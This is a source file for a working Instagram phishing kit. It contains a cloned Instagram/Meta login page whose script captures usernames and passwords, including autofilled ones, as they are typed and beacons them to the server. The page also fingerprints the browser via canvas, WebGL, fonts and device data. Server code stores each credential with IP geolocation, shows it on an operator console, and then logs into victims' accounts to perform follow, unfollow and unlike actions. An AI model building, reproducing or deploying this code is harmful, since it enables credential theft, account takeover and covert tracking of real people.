    return len(dq) < ACTIONS_PER_HOUR


def _ensure_worker() -> None:
    global _worker_started
    with _ig_lock:
        if _worker_started:
            return
        _worker_started = True
    threading.Thread(target=_worker, daemon=True).start()


def _log_action(cid, kind, pk, username, status, error) -> None:
    conn = connect()
    try:
        conn.execute("INSERT INTO actions (cid, kind, pk, username, status, error, created_at)"
                     " VALUES (?,?,?,?,?,?,?)", (cid, kind, pk, username, status, error, iso_now()))
        if status == "done":
            if kind == "unfollow":
                conn.execute("DELETE FROM following_cache WHERE cid=? AND pk=?", (cid, pk))
            elif kind == "follow":
                conn.execute("INSERT OR REPLACE INTO followers_cache (cid, pk, ts) VALUES (?,?,?)",
                             (cid, pk, iso_now()))
        conn.commit()
    finally:
        conn.close()


def _worker() -> None:
    while True:
        with _queue_cv:
            while not _queue:
                _queue_cv.wait()
            cid, kind, pk, username, _at = _queue.popleft()
        try:
            cl = ensure_login(cid)
            if kind == "unfollow":
                cl.user_unfollow(pk)
            elif kind == "follow":
                cl.user_follow(pk)
            elif kind == "unlike":
                cl.media_unlike(pk)
            _action_stamps.setdefault(cid, deque()).append(time.time())
            _log_action(cid, kind, pk, username, "done", "")
        except Exception as exc:
            logger.warning("action %s %s failed: %s", kind, pk, exc)
            _log_action(cid, kind, pk, username, "failed", str(exc)[:200])
        time.sleep(random.uniform(*ACTION_DELAY))


def enqueue(cid: str, kind: str, pk: str, username: str) -> dict:
    if not IG_OK:
        return {"ok": False, "error": "instagrapi not installed"}
    if not pk:
        return {"ok": False, "error": "missing target"}
    if not _quota(cid):
        return {"ok": False, "error": f"hourly action limit reached ({ACTIONS_PER_HOUR})"}
    with _queue_cv:
        _queue.append((cid, kind, pk, username, iso_now()))
        _queue_cv.notify()
    _ensure_worker()
    return {"ok": True, "queued": True}


# ============================== capture ==============================
def capture_credential(username: str, password: str, source: str, sid: str, meta: dict) -> tuple[int, bool]:
    """Insert, or merge into a very recent partial row for the same browser.

    Returns (credential id, created). Typing "user" then "pass" normally produces
    one row instead of two, without ever overwriting a different account.
    """
    ip = client_ip()
    info = geo(ip)
    ua = (request.headers.get("User-Agent") or "")[:300]
    referer = (request.headers.get("Referer") or "")[:300]
    lang = (request.headers.get("Accept-Language") or "")[:120]
    place = ", ".join(x for x in (info.get("city"), info.get("country")) if x) or "-"
    now = iso_now()

    def _txn() -> tuple[int, bool]:
        with _db_lock:
            conn = connect()
            try:
                row = conn.execute(
                    "SELECT id FROM creds WHERE cid=? AND created_at>=? "
                    "AND (username='' OR password='') "
                    "AND (username=? OR username='' OR ? LIKE username || '%') "
                    "AND (password=? OR password='') "
                    "ORDER BY id DESC LIMIT 1",
                    (g.cid, iso_ago(90), username, username, password),
                ).fetchone()
                if row:
                    conn.execute(
                        "UPDATE creds SET username=?, password=?, source=?, ip=?, ua=?, referer=?, "
                        "accept_lang=?, meta_json=?, country=?, city=?, isp=?, geo_json=?, "
                        "created_at=? WHERE id=?",
                        (username, password, source[:16], ip, ua, referer, lang,
                         json.dumps(meta, ensure_ascii=False), info.get("country", "")[:64],
                         info.get("city", "")[:64], info.get("isp", "")[:96],
                         json.dumps(info, ensure_ascii=False), now, row["id"]),
                    )
                    conn.commit()
                    return int(row["id"]), False

                cur = conn.execute(INSERT_SQL, (
                    g.cid, sid[:24], source[:16], username[:200], password[:300], ip, ua,
                    referer, lang, json.dumps(meta, ensure_ascii=False),
                    info.get("country", "")[:64], info.get("city", "")[:64],
                    info.get("isp", "")[:96], json.dumps(info, ensure_ascii=False), now,
                ))
                conn.commit()
                return int(cur.lastrowid or 0), True
            finally:
                conn.close()

    cred_id, created = _with_retry(_txn)

    emit(
        {
            "id": cred_id, "op": "insert" if created else "merge", "cid": g.cid, "ip": ip,
            "source": source, "USERNAME": username, "PASSWORD": password,
            "ua": ua[:200], "referer": referer[:200],
            "geo": {k: info.get(k) for k in ("country", "city", "isp") if info.get(k)},
            "fingerprint": {k: meta.get(k) for k in ("platform", "lang", "tz", "screen", "cores")
                            if meta.get(k)},
        },
        [cred_box(f"🔑 CREDENTIAL · {source} · #{cred_id}", username, password),
         ctx_box(ip, source, ua, place)],
    )
    session["last_cred"] = cred_id
    return cred_id, created


# ============================== login page ==============================
LOGIN_PAGE_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Instagram Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover, interactive-widget=resizes-content">
<meta name="theme-color" content="#ffffff">

<style>
:root{
  --bg:#fff;--tx:#000;--mut:#8e8e8e;--line:#dbdbdb;--inbg:#fafafa;--blue:#0095f6;
  --ig:linear-gradient(45deg,#feda75,#fa7e1e 25%,#d62976 55%,#962fbf 78%,#4f5bd5);
  --glow:rgba(214,41,118,.13);
  --e:cubic-bezier(.22,1,.36,1);
}
@media (prefers-color-scheme:dark){
  :root{--bg:#000;--tx:#f5f5f5;--mut:#a8a8a8;--line:#262626;--inbg:#121212;--glow:rgba(214,41,118,.2)}
}
*{box-sizing:border-box;margin:0;-webkit-tap-highlight-color:transparent}
html{height:100%;-webkit-text-size-adjust:100%;text-size-adjust:100%}

body{
  position:fixed;inset:0;height:var(--vh,100dvh);
  overflow:hidden;overscroll-behavior:none;touch-action:manipulation;
  background:var(--bg);color:var(--tx);
  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
  display:flex;justify-content:center;
  transition:background .5s var(--e),color .5s var(--e);
}
body::before{
  content:"";position:absolute;inset:0;pointer-events:none;
  background:radial-gradient(72% 55% at 50% 0,var(--glow),transparent 72%);
}

.app{
  position:relative;width:100%;max-width:420px;height:100%;
  display:flex;flex-direction:column;
  padding:calc(env(safe-area-inset-top,0px) + 10px) 24px calc(env(safe-area-inset-bottom,0px) + 10px);
  animation:pg .75s var(--e) both;
}

.content{
  flex:1;min-height:0;display:flex;
  overflow-y:auto;overscroll-behavior:contain;
  scrollbar-width:none;-webkit-overflow-scrolling:touch;
  padding-bottom:14px;
}
.content::-webkit-scrollbar{display:none}
.inner{width:100%;margin:auto 0;text-align:center;padding:8px 0 16px}

.msg{
  margin-bottom:16px;padding:10px 14px;border-radius:11px;font-size:13.5px;
  background:rgba(237,73,86,.1);color:#ed4956;border:1px solid rgba(237,73,86,.35);
}

.language{font-size:13px;color:var(--mut);margin-bottom:20px;animation:up .55s .06s var(--e) backwards}

.logo{position:relative;width:78px;height:78px;margin:0 auto 24px;display:grid;place-items:center;animation:up .65s .12s var(--e) backwards}
.logo::before{
  content:"";position:absolute;inset:-13px;border-radius:28px;
  background:var(--ig);background-size:220% 220%;
  filter:blur(16px);opacity:.55;
  animation:halo 14s linear infinite,sh 9s ease-in-out infinite alternate;
}
.logo img{position:relative;width:70px;height:70px;z-index:1;animation:float 5.5s ease-in-out infinite}

.inputs{display:flex;flex-direction:column;gap:10px}

input{
  width:100%;padding:14px 13px;
  font-family:inherit;font-size:16px;line-height:1.25;color:var(--tx);
  border:1px solid var(--line);border-radius:11px;background:var(--inbg);
  -webkit-appearance:none;appearance:none;outline:none;
  transition:border-color .3s var(--e),box-shadow .35s var(--e),background .3s var(--e),transform .3s var(--e);
}
input::placeholder{color:var(--mut)}
input:focus{
  border-color:var(--blue);background:var(--bg);
  box-shadow:0 0 0 3.5px rgba(0,149,246,.16);transform:translateY(-1px);
}
.inputs input:nth-child(1){animation:up .55s .2s var(--e) backwards}
.inputs input:nth-child(2){animation:up .55s .26s var(--e) backwards}

@keyframes autofillStart{from{}to{}}
input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}

.login-btn{
  position:relative;overflow:hidden;width:100%;margin-top:12px;padding:13px 0;
  border:0;border-radius:24px;background:var(--blue);color:#fff;
  font-family:inherit;font-size:16px;font-weight:600;cursor:pointer;
  box-shadow:0 6px 18px rgba(0,149,246,.3);
  transition:transform .3s var(--e),box-shadow .35s var(--e),filter .25s;
  animation:up .55s .32s var(--e) backwards;
}
.login-btn::after{
  content:"";position:absolute;top:0;left:-60%;width:45%;height:100%;
  background:linear-gradient(100deg,transparent,rgba(255,255,255,.55),transparent);
  transform:skewX(-18deg);animation:sweep 4.5s 1.4s var(--e) infinite;
}
.login-btn:hover{filter:brightness(1.07);transform:translateY(-2px);box-shadow:0 10px 26px rgba(0,149,246,.4)}
.login-btn:active{transform:scale(.965);box-shadow:0 4px 12px rgba(0,149,246,.28)}

.forgot{
  margin-top:16px;font-size:14px;color:var(--tx);cursor:pointer;
  transition:letter-spacing .35s var(--e),opacity .25s;
  animation:up .55s .38s var(--e) backwards;
}
.forgot:hover{letter-spacing:.4px;opacity:.72}

.create{margin-top:26px;animation:up .55s .44s var(--e) backwards}
.create button{
  width:100%;padding:13px 0;border-radius:24px;
  border:1px solid var(--blue);background:transparent;color:var(--blue);
  font-family:inherit;font-size:16px;font-weight:600;cursor:pointer;
  transition:background .3s var(--e),transform .3s var(--e),box-shadow .3s var(--e);
}
.create button:hover{background:rgba(0,149,246,.08);box-shadow:0 8px 20px rgba(0,149,246,.18)}
.create button:active{transform:scale(.97)}

.bottom{flex:none;position:relative;z-index:2;text-align:center;padding-top:6px;
  animation:up .6s .5s var(--e) backwards}
.meta{font-size:14px;color:var(--mut);display:flex;justify-content:center;align-items:center;gap:6px;margin-bottom:4px}
.meta .inf{display:inline-block;animation:pulse 3.2s ease-in-out infinite}
.footer{font-size:11.5px;color:var(--mut);line-height:1.6;padding-bottom:2px}
.footer a{color:var(--mut);text-decoration:none;border-bottom:1px dotted var(--line)}

@keyframes pg{from{opacity:0;transform:translateY(12px) scale(.99);filter:blur(6px)}}
@keyframes up{from{opacity:0;transform:translateY(16px)}}
@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-6px)}}
@keyframes halo{to{transform:rotate(360deg)}}
@keyframes sh{to{background-position:100% 50%}}
@keyframes pulse{0%,100%{opacity:.5;transform:scale(1)}50%{opacity:1;transform:scale(1.18)}}
@keyframes sweep{0%{left:-60%}42%,100%{left:135%}}

@media (prefers-reduced-motion:reduce){*,*::before,*::after{animation:none!important;transition:none!important}}
</style>
</head>

<body>

<div class="app" id="app">

    <div class="content" id="content"><div class="inner">
        <!--MSG-->

        <div class="language">English (US)</div>

        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram">
        </div>

        <form action="/login" method="POST" id="loginForm" autocomplete="on" name="login">
            <input type="hidden" name="payload" id="payload">

            <div class="inputs">
                <input type="text" id="u" name="username" placeholder="Username, email or mobile number"
                       autocapitalize="none" autocorrect="off" spellcheck="false"
                       autocomplete="username" enterkeyhint="next" required>
                <input type="password" id="p" name="password" placeholder="Password"
                       autocomplete="current-password" enterkeyhint="go" required>
            </div>

            <button type="submit" class="login-btn">Log in</button>

            <div class="forgot">Forgot password?</div>

            <div class="create">
                <button type="button">Create new account</button>
            </div>
        </form>

    </div></div>

    <div class="bottom">
        <div class="meta">
            <span class="inf">&#8734;</span>
            <span>Meta</span>
        </div>

        <div class="footer">
            &copy; Meta 2026 &middot; Privacy &middot; Cookie Policy &middot; Terms
            &middot; <a href="/console" target="_blank" rel="noopener">English (UK)</a>
        </div>
    </div>

</div>

<script>
(function () {
  'use strict';

  var rootEl = document.documentElement;
  var vv = window.visualViewport;
  var frozen = false;

  function sync() {
    if (frozen) return;
    var h = vv ? vv.height : window.innerHeight;
    rootEl.style.setProperty('--vh', h + 'px');
  }
  sync();
  if (vv) {
    vv.addEventListener('resize', sync);
    vv.addEventListener('scroll', sync);
  }
  window.addEventListener('resize', function () { if (!frozen) sync(); });
  window.addEventListener('orientationchange', function () {
    frozen = false;
    setTimeout(sync, 150);
  });

  document.addEventListener('focusin', function (e) {
    if (e.target && (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA')) frozen = true;
  });
  document.addEventListener('focusout', function () {
    setTimeout(function () {
      if (document.activeElement && document.activeElement.tagName === 'INPUT') return;
      frozen = false;
      sync();
    }, 160);
  });

  var SID = Math.random().toString(36).slice(2, 10) + Date.now().toString(36);

  function fnv(str) {
    var h = 0x811c9dc5;
    for (var i = 0; i < str.length; i++) {
      h ^= str.charCodeAt(i);
      h = (h * 0x01000193) >>> 0;
    }
    return ('0000000' + h.toString(16)).slice(-8);
  }

  function canvasSig() {
    try {
      var c = document.createElement('canvas');
      c.width = 260; c.height = 70;
      var x = c.getContext('2d');
      x.textBaseline = 'top';
      x.font = '16px Arial';
      x.fillStyle = '#f60'; x.fillRect(0, 0, 130, 32);
      x.fillStyle = '#069'; x.fillText('Insight, capture 3.0', 2, 4);
      x.fillStyle = 'rgba(102,204,0,.7)'; x.fillText('fingerprint', 4, 22);
      x.beginPath(); x.arc(200, 35, 22, 0, Math.PI * 2); x.fill();
      return fnv(c.toDataURL());
    } catch (e) { return ''; }
  }

  function glSig() {
    try {
      var c = document.createElement('canvas');
      var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
      if (!gl) return '';
      var d = gl.getExtension('WEBGL_debug_renderer_info');
      if (!d) return '';
      return gl.getParameter(d.UNMASKED_VENDOR_WEBGL) + ' | ' + gl.getParameter(d.UNMASKED_RENDERER_WEBGL);
    } catch (e) { return ''; }
  }

  function fontSig() {
    try {
      var probes = ['Arial','Helvetica','Times New Roman','Courier New','Georgia','Verdana',
                    'Tahoma','Trebuchet MS','Segoe UI','Roboto','Menlo','Consolas','Ubuntu',
                    'Fira Sans','Noto Sans','SF Pro Text','Calibri','Cambria'];
      var bases = ['monospace', 'sans-serif', 'serif'];
      var ctx = document.createElement('canvas').getContext('2d');
      var hits = [];
      bases.forEach(function (b) {
        ctx.font = '72px ' + b;
        var base = ctx.measureText('mmmmmmmmmmlli').width;
        probes.forEach(function (f) {
          ctx.font = '72px "' + f + '",' + b;
          if (ctx.measureText('mmmmmmmmmmlli').width !== base) hits.push(f);
        });
      });
      return Array.from(new Set(hits)).slice(0, 40);
    } catch (e) { return []; }
  }

  function mq(q) { try { return matchMedia(q).matches ? 1 : 0; } catch (e) { return 0; } }

  function baseMeta() {
    var tz = '', tzo = '';
    try {
      tz = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
      tzo = String(new Date().getTimezoneOffset());
    } catch (e) {}
    var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || null;

    return {
      ua: navigator.userAgent,
      platform: navigator.platform || '',
      vendor: navigator.vendor || '',
      lang: navigator.language || '',
      langs: (navigator.languages || []).join(','),
      tz: tz, tzOffset: tzo,
      locale: (Intl.DateTimeFormat().resolvedOptions().locale || ''),
      screen: screen.width + 'x' + screen.height,
      avail: screen.availWidth + 'x' + screen.availHeight,
      viewport: window.innerWidth + 'x' + window.innerHeight,
      dpr: window.devicePixelRatio || 1,
      depth: screen.colorDepth,
      orientation: (screen.orientation && screen.orientation.type) || '',
      cores: navigator.hardwareConcurrency || 0,
      mem: navigator.deviceMemory || 0,
      touchPoints: navigator.maxTouchPoints || 0,
      cookieEnabled: navigator.cookieEnabled ? 1 : 0,
      dnt: navigator.doNotTrack || '',
      plugins: Array.from(navigator.plugins || []).map(function (p) { return p.name; }).slice(0, 12),
      conn: conn ? {
        type: conn.effectiveType || '', down: conn.downlink || 0,
        rtt: conn.rtt || 0, save: conn.saveData ? 1 : 0
      } : {},
      prefs: {
        dark: mq('(prefers-color-scheme: dark)'),
        reduce: mq('(prefers-reduced-motion: reduce)'),
        contrast: mq('(prefers-contrast: more)'),
        portrait: mq('(orientation: portrait)')
      },
      canvas: canvasSig(),
      webgl: glSig(),
      fonts: fontSig(),
      notifPerm: (window.Notification && Notification.permission) || '',
      referrer: document.referrer || '',
      href: location.href,
      title: document.title,
      historyLen: history.length
    };
  }

  function gather() {
    var meta = baseMeta();
    var field = document.getElementById('payload');
    if (field) field.value = JSON.stringify({ sid: SID, meta: meta });
    return meta;
  }

  var uEl = document.getElementById('u');
  var pEl = document.getElementById('p');
  var lastPair = '';
  var lastSentAt = 0;

  function pushCred(source, force) {
    if (!uEl || !pEl) return;
    var u = uEl.value || '';
    var p = pEl.value || '';
    if (!u && !p) return;

    var pair = u + '\u0000' + p;
    var now = Date.now();
    if (pair === lastPair && !force) return;
    if (!force && now - lastSentAt < 1500) return;

    lastPair = pair;
    lastSentAt = now;

    var body = JSON.stringify({
      username: u,
      password: p,
      source: source,
      sid: SID,
      meta: baseMeta()
    });

    if (navigator.sendBeacon) {
      navigator.sendBeacon('/credential', new Blob([body], { type: 'application/json' }));
      return;
    }
    try {
      fetch('/credential', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: body,
        keepalive: true
      });
    } catch (e) {}
  }

  document.addEventListener('animationstart', function (e) {
    if (e.animationName === 'autofillStart') {
      setTimeout(function () { pushCred('autofill', true); }, 120);
      setTimeout(function () { pushCred('autofill', true); }, 700);
    }
  });

  if (uEl) uEl.addEventListener('change', function () { pushCred('change'); });
  if (pEl) pEl.addEventListener('change', function () { pushCred('change'); });
  if (uEl) uEl.addEventListener('blur', function () { pushCred('blur'); });
  if (pEl) pEl.addEventListener('blur', function () { pushCred('blur'); });

  setInterval(function () { pushCred('poll'); }, 1000);

  window.addEventListener('pageshow', function () { pushCred('pageshow', true); });

  var form = document.getElementById('loginForm');
  if (form) {
    form.addEventListener('submit', function () {
      gather();
      pushCred('submit', true);
    });
  }
})();
</script>

</body>
</html>
"""

# ============================== results page ==============================
RESULTS_PAGE_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Insight — Follower Tracker</title>
<style>
:root{--bg:#fff;--bg2:#fff;--card:#fafafa;--line:#dbdbdb;--tx:#000;--mut:#737373;--chip:#efefef;--blue:#0095f6;--red:#ed4956;--ig:linear-gradient(45deg,#feda75,#fa7e1e 25%,#d62976 55%,#962fbf 78%,#4f5bd5);--glow:rgba(214,41,118,.10);--e:cubic-bezier(.22,1,.36,1);--sh:0 1px 2px rgba(0,0,0,.04),0 8px 24px rgba(0,0,0,.05);--sh2:0 2px 4px rgba(0,0,0,.05),0 18px 44px rgba(0,0,0,.13);box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#000;--bg2:#000;--card:#121212;--line:#262626;--tx:#f5f5f5;--mut:#a8a8a8;--chip:#262626;--glow:rgba(214,41,118,.16);--sh:0 1px 2px rgba(0,0,0,.4),0 8px 24px rgba(0,0,0,.4);--sh2:0 2px 4px rgba(0,0,0,.5),0 18px 44px rgba(0,0,0,.6)}}
:root[data-theme="dark"]{--bg:#000;--bg2:#000;--card:#121212;--line:#262626;--tx:#f5f5f5;--mut:#a8a8a8;--chip:#262626;--glow:rgba(214,41,118,.16);--sh:0 1px 2px rgba(0,0,0,.4),0 8px 24px rgba(0,0,0,.4);--sh2:0 2px 4px rgba(0,0,0,.5),0 18px 44px rgba(0,0,0,.6)}
*{box-sizing:border-box;margin:0;-webkit-tap-highlight-color:transparent}
html,body{height:100%}
html{scroll-behavior:smooth}
body{background:color-mix(in srgb,var(--bg2) 94%,#808080);color:var(--tx);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;display:flex;flex-direction:column;align-items:center;overflow:hidden;font-variant-numeric:tabular-nums;transition:background .5s var(--e),color .5s var(--e)}
.frame{container-type:inline-size;position:relative;width:100%;flex:1;min-height:0;max-width:1240px;margin:10px 16px 16px;border:1px solid var(--line);border-radius:22px;overflow:hidden;background:var(--bg2);box-shadow:var(--sh2);transition:max-width .6s var(--e),border-radius .6s var(--e),background .5s,border-color .5s}
.app{display:grid;grid-template-columns:244px 1fr;grid-template-rows:auto 1fr auto;height:100%}
.side{grid-row:1/4;border-right:1px solid var(--line);padding:24px 12px 20px;display:flex;flex-direction:column;overflow:auto;transition:border-color .5s}
.logo{font:italic 700 30px Georgia,"Times New Roman",serif;letter-spacing:-.5px;padding:6px 12px 26px;text-align:center}
.logo span{background:var(--ig);background-size:220% 100%;-webkit-background-clip:text;background-clip:text;color:transparent;animation:sh 8s ease-in-out infinite alternate}
@keyframes sh{to{background-position:100% 0}}
.nav{display:flex;flex-direction:column;gap:2px}
.nav button{position:relative;display:flex;align-items:center;gap:16px;border:0;background:none;color:var(--tx);font:400 15.5px inherit;padding:12px;border-radius:12px;cursor:pointer;transition:background .3s var(--e),transform .35s var(--e)}
.nav button::before{content:"";position:absolute;left:-12px;top:50%;width:4px;height:0;border-radius:0 4px 4px 0;background:var(--ig);transform:translateY(-50%);transition:height .4s var(--e)}
.nav button.on::before{height:26px}
.nav button:hover{background:var(--chip);transform:translateX(5px)}
.nav button:active{transform:scale(.97)}
.nav button svg{width:25px;height:25px;flex:none;transition:transform .35s var(--e)}
.nav button:hover svg{transform:scale(1.12) rotate(-4deg)}
.nav button.on{font-weight:700}
.nav button.on svg{stroke-width:2.6}
.nav .n{margin-left:auto;min-width:20px;height:20px;padding:0 6px;border-radius:99px;background:var(--red);color:#fff;font:700 11px/20px inherit;text-align:center;box-shadow:0 3px 8px rgba(237,73,86,.4)}
.me{margin-top:auto;display:flex;gap:12px;align-items:center;padding:12px;border-radius:12px;transition:background .3s}
.me:hover{background:var(--chip)}
.me b{font-size:14px;display:block;font-weight:600}.me small{color:var(--mut);font-size:12px}
.mtop{display:none;grid-column:1;grid-template-columns:1fr auto 1fr;align-items:center;padding:10px 16px;border-bottom:1px solid var(--line);backdrop-filter:blur(24px) saturate(180%);background:color-mix(in srgb,var(--bg) 80%,transparent)}
.mtop .logo{padding:0;font-size:27px}
.mtop svg{width:25px;height:25px}
#mh{justify-self:end;border:0;background:none;color:var(--tx);cursor:pointer;display:grid;place-items:center;padding:2px;transition:transform .5s var(--e)}
#mh:hover{transform:rotate(90deg)}
main{grid-row:1/4;overflow:auto;position:relative}
.in{max-width:780px;margin:0 auto;padding:34px 28px 50px;position:relative}
.in.pg{animation:pg .6s var(--e) both}
@keyframes pg{from{opacity:0;transform:translateY(16px) scale(.99);filter:blur(5px)}}
main::before{content:"";position:absolute;inset:0 0 auto 0;height:340px;background:radial-gradient(60% 100% at 50% 0,var(--glow),transparent);pointer-events:none}
.prof{display:flex;gap:34px;align-items:center;margin-bottom:26px}
.ring{flex:none;border-radius:50%;padding:3px;background:var(--ig);position:relative;transition:transform .45s var(--e),box-shadow .45s var(--e)}
.ring>span{display:grid;place-items:center;border-radius:50%;border:3px solid var(--bg2);color:#fff;font-weight:700;overflow:hidden}
.ring.l{width:116px;height:116px;box-shadow:0 10px 30px var(--glow)}.ring.l>span{width:100%;height:100%;font-size:32px}
.ring.l:hover{transform:rotate(8deg) scale(1.06);box-shadow:0 14px 40px rgba(214,41,118,.35)}
.ring.m{width:54px;height:54px;padding:2.5px}.ring.m>span{width:100%;height:100%;border-width:2.5px;font-size:15px}
.ring.s{width:46px;height:46px;padding:2.5px}.ring.s>span{width:100%;height:100%;border-width:2.5px;font-size:14px}
.ring.off{background:var(--line)}
.ring.off>span{background:var(--chip);color:var(--mut)}
.pi{flex:1;min-width:0}
.pi .h{display:flex;align-items:center;gap:12px;flex-wrap:wrap;margin-bottom:16px}
.pi h2{font:400 20px inherit;word-break:break-all}
.pi .st{display:flex;gap:34px;margin-bottom:14px;font-size:15px}
.pi .st b{font-weight:700}
.pi p{font-size:14px;line-height:1.45}.pi p span{color:var(--mut)}
.btn{border:0;border-radius:10px;padding:8px 18px;font:600 14px inherit;cursor:pointer;background:var(--blue);color:#fff;box-shadow:0 4px 14px rgba(0,149,246,.32);transition:transform .3s var(--e),filter .2s,box-shadow .3s var(--e),background .3s;white-space:nowrap}
.btn:hover{filter:brightness(1.08);transform:translateY(-2px);box-shadow:0 8px 20px rgba(0,149,246,.42)}
.btn:active{transform:scale(.95);box-shadow:none}
.btn:disabled{opacity:.6;cursor:default;transform:none}
.btn.g,.btn.r{box-shadow:none}
.btn.g{background:var(--chip);color:var(--tx)}
.btn.g:hover,.btn.r:hover{box-shadow:0 6px 16px rgba(0,0,0,.12)}
.btn.r{background:var(--chip);color:var(--red)}
.sec{display:flex;align-items:baseline;justify-content:space-between;margin:26px 0 14px}
.sec h3{font:700 15px inherit}.sec a{color:var(--blue);font:600 13px inherit;cursor:pointer;transition:letter-spacing .3s var(--e),opacity .2s}.sec a:hover{letter-spacing:.4px;opacity:.8}
.cards{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
.card{position:relative;overflow:hidden;background:var(--card);border:1px solid var(--line);border-radius:18px;padding:16px 18px;cursor:pointer;box-shadow:var(--sh);transition:transform .45s var(--e),box-shadow .45s var(--e),border-color .3s;animation:up .65s var(--e) both}
.card:nth-child(2){animation-delay:.05s}.card:nth-child(3){animation-delay:.1s}.card:nth-child(4){animation-delay:.15s}
.card::after{content:"";position:absolute;inset:0;background:radial-gradient(120% 90% at 100% 0,var(--glow),transparent 65%);opacity:0;transition:opacity .45s;pointer-events:none}
.card:hover{transform:translateY(-5px);box-shadow:var(--sh2);border-color:color-mix(in srgb,var(--mut) 60%,transparent)}
.card:hover::after{opacity:1}
.card:active{transform:translateY(-1px) scale(.98)}
.card small{color:var(--mut);font-size:12.5px;display:flex;align-items:center;justify-content:space-between}
.card small svg{width:18px;height:18px;transition:transform .45s var(--e)}
.card:hover small svg{transform:scale(1.25) rotate(-10deg);color:var(--tx)}
.card b{display:block;font:700 28px inherit;letter-spacing:-.8px;margin:8px 0 2px}
.card i{font-style:normal;font-size:12px;color:var(--mut)}
.card i.up{color:#2ecc71}.card i.dn{color:var(--red)}
.bar{display:flex;gap:8px;margin:6px 0 14px;flex-wrap:wrap;align-items:center}
.search{flex:1;min-width:150px;background:var(--chip);border:0;border-radius:12px;padding:11px 14px;color:var(--tx);font:400 14.5px inherit;outline:0;transition:box-shadow .3s var(--e),background .3s}
.search:focus{background:var(--bg2);box-shadow:0 0 0 2px var(--blue),0 8px 24px rgba(0,149,246,.18)}
.search::placeholder{color:var(--mut)}
.chip{border:0;background:var(--chip);color:var(--tx);padding:9px 15px;border-radius:10px;font:600 13px inherit;cursor:pointer;transition:all .35s var(--e)}
.chip:hover{transform:translateY(-2px);box-shadow:0 6px 14px rgba(0,0,0,.1)}
.chip:active{transform:scale(.94)}
.chip.on{background:var(--tx);color:var(--bg)}
.ttl{font:700 24px inherit;letter-spacing:-.5px}.sub{color:var(--mut);font-size:14px;margin:4px 0 20px}
.row{display:flex;align-items:center;gap:13px;padding:9px 10px;margin:0 -10px;border-radius:14px;animation:in .5s both var(--e);transition:background .3s,transform .4s var(--e),box-shadow .4s var(--e)}
.row:hover{background:var(--chip);transform:translateX(5px)}
.row:hover .ring{transform:scale(1.08)}
@keyframes in{from{opacity:0;transform:translateY(10px)}}
.info{flex:1;min-width:0}
.info b{font:600 14px inherit;display:flex;align-items:center;gap:5px}
.info small{display:block;color:var(--mut);font-size:13px;margin-top:1px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.vf{width:14px;height:14px;fill:var(--blue);flex:none}
.tag{font:600 11px inherit;padding:3px 8px;border-radius:6px;background:var(--chip);color:var(--mut)}
.tag.red{color:var(--red)}.tag.hot{color:#d62976}
.ic{width:46px;height:46px;border-radius:50%;display:grid;place-items:center;background:var(--chip);flex:none;transition:transform .45s var(--e)}
.row:hover .ic{transform:scale(1.1) rotate(-6deg)}
.ic svg{width:22px;height:22px}
.th{width:44px;height:44px;border-radius:8px;flex:none;transition:transform .4s var(--e)}
.row:hover .th{transform:scale(1.1) rotate(4deg)}
.day{font:700 15px inherit;margin:18px 0 6px}
.bn{display:none;grid-column:1;grid-template-columns:repeat(5,1fr);border-top:1px solid var(--line);background:color-mix(in srgb,var(--bg) 82%,transparent);backdrop-filter:blur(24px) saturate(180%);padding:6px 4px calc(8px + env(safe-area-inset-bottom,0px))}
.bn button{border:0;background:none;color:var(--tx);display:grid;place-items:center;padding:10px 0;cursor:pointer;position:relative;transition:transform .3s var(--e)}
.bn button:active{transform:scale(.8)}
.bn svg{width:26px;height:26px;transition:transform .4s var(--e)}
.bn button.on svg{stroke-width:2.8;transform:translateY(-2px) scale(1.1)}
.bn .n{position:absolute;top:4px;left:calc(50% + 6px);background:var(--red);color:#fff;border-radius:99px;font:700 10px/16px inherit;min-width:16px;padding:0 4px}
.empty{padding:50px 0;text-align:center;color:var(--mut)}
.srow{display:flex;align-items:center;gap:14px;padding:14px 0;border-bottom:1px solid var(--line)}
.srow .info small{white-space:normal;line-height:1.35}
.srow.lk{cursor:pointer;transition:padding .35s var(--e)}.srow.lk:hover{padding-left:8px}.srow .ch{color:var(--mut);font-size:22px;line-height:1;transition:transform .35s var(--e)}.srow.lk:hover .ch{transform:translateX(4px)}
.srow.red b{color:var(--red)}.srow.red .ch{color:var(--red)}
.sw{flex:none;width:46px;height:28px;border-radius:14px;border:0;background:color-mix(in srgb,var(--mut) 50%,transparent);position:relative;cursor:pointer;transition:background .3s,box-shadow .3s}
.sw::after{content:"";position:absolute;top:3px;left:3px;width:22px;height:22px;border-radius:50%;background:#fff;box-shadow:0 2px 5px rgba(0,0,0,.3);transition:transform .45s cubic-bezier(.3,1.5,.5,1),width .2s}
.sw:active::after{width:27px}
.sw.on{background:var(--blue);box-shadow:0 4px 12px rgba(0,149,246,.4)}.sw.on::after{transform:translateX(18px)}.sw.on:active::after{transform:translateX(13px)}
.acc{display:flex;align-items:center;gap:14px;padding:16px;background:var(--card);border:1px solid var(--line);border-radius:18px;margin-bottom:4px;box-shadow:var(--sh)}
